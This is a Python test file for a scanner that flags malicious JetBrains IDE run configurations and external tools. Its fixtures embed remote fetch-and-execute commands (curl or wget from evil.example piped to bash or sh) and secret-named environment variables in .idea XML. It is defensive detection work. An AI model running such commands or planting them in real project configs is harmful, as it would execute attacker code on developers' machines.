"""Tests for JetBrains IDE project config scanning (.idea run configs, external tools)."""

from pathlib import Path

from skillseraph.checks.jetbrains import check_jetbrains
from skillseraph.models import Platform
from skillseraph.scanner import scan_directory, scan_file

RUNCONFIG = Path(".idea/runConfigurations/setup.xml")
WORKSPACE = Path(".idea/workspace.xml")


class TestJetBrainsChecks:
    def test_shell_runconfig_remote_fetch_detected(self):
        content = (
            '<configuration name="setup" type="ShConfigurationType">\n'
            '  <option name="SCRIPT_TEXT" value="curl https://evil.example/x.sh | bash" />\n'
            '</configuration>\n'
        )
        findings = check_jetbrains(RUNCONFIG, content)
        assert any(f.check == "jetbrains_runconfig_remote_fetch" for f in findings)

    def test_external_tool_remote_fetch_detected(self):
        content = (
            '<tool name="evil">\n'
            '  <exec>\n'
            '    <option name="COMMAND" value="/bin/bash" />\n'
            '    <option name="PARAMETERS" value="-c &quot;wget https://evil.example/p | sh&quot;" />\n'
            '  </exec>\n'
            '</tool>\n'
        )
        findings = check_jetbrains(Path(".idea/tools/External Tools.xml"), content)
        assert any(f.check == "jetbrains_runconfig_remote_fetch" for f in findings)

    def test_env_secret_injection_detected(self):
        content = (
            '<configuration name="run">\n'
            '  <envs>\n'
            '    <env name="AWS_SECRET_ACCESS_KEY" value="not-real" />\n'
            '  </envs>\n'
            '</configuration>\n'
        )
        findings = check_jetbrains(RUNCONFIG, content)
        assert any(f.check == "jetbrains_runconfig_env_secret" for f in findings)

    def test_benign_runconfig_no_findings(self):
        content = (
            '<configuration name="tests" type="PythonConfigurationType">\n'
            '  <option name="SCRIPT_NAME" value="run_tests.py" />\n'
            '  <env name="PYTHONPATH" value="src" />\n'
            '</configuration>\n'
        )
        findings = check_jetbrains(RUNCONFIG, content)
        assert findings == []

    def test_non_jetbrains_file_skipped(self):
        content = '<option name="SCRIPT_TEXT" value="curl https://evil/x | bash" />'
        findings = check_jetbrains(Path("config.xml"), content)
        assert findings == []


class TestJetBrainsPlatform:
    def test_idea_workspace_detected_and_scanned(self, tmp_path: Path):
        f = tmp_path / ".idea" / "workspace.xml"
        f.parent.mkdir(parents=True)
        f.write_text(
            '<project>\n'
            '  <configuration name="x" type="ShConfigurationType">\n'
            '    <option name="SCRIPT_TEXT" value="curl https://evil.example/x.sh | bash" />\n'
            '  </configuration>\n'
            '</project>\n'
        )

        result = scan_directory(tmp_path)

        assert Platform.JETBRAINS in result.platforms_detected
        assert any(f.check == "jetbrains_runconfig_remote_fetch" for f in result.findings)

    def test_iml_file_is_scanned(self, tmp_path: Path):
        f = tmp_path / "project.iml"
        f.write_text('<module><env name="GITHUB_TOKEN" value="x" /></module>')
        findings = scan_file(f)
        assert any(f_.check == "jetbrains_runconfig_env_secret" for f_ in findings)
